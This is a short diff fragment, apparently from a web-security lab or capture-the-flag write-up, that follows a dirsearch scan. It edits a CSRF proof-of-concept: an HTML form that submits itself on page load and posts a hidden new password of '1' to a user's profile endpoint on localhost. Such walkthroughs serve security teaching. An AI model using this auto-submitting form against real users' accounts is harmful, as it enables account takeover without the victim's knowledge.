@@ -94,7 +94,7 @@ python3 dirsearch.py -u http://localhost:3000 -e html,php
 
 <body onload='document.csrf.submit()'>
 
-<form action='Url of that user's profile whose password you wanna change' name='csrf' method='POST'>
+<form action='http://localhost:3000/users/profile/6019076df85a8b0ba08ef990' name='csrf' method='POST'>
 
 <input type='hidden' name='password' value='1'>
 
